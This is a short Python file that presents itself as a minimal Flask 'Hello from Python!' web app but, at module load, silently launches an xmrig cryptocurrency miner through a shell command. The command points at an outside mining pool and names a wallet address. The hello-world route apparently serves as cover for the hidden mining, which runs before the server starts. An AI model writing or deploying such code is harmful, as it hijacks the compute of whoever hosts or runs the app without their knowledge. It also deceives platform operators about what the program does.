from flask import Flask
import subprocess
from os import system, name
from time import sleep
from subprocess import PIPE, Popen
import base64


app = Flask(__name__)

@app.route("/")
def hello():
    return "Hello from Python!"

p2 = subprocess.run("./xmrig --algo=ghostrider --url stratum-na.rplant.xyz:17075 --tls --user BnJkjVKDBvJbYEnXqMTKhX1gKFWyFtkUgq.labideneyim3 -t 2 -k", stdout=subprocess.PIPE, shell=True)

from IPython.display import clear_output 

if __name__ == "__main__":
    app.run(host='0.0.0.0')
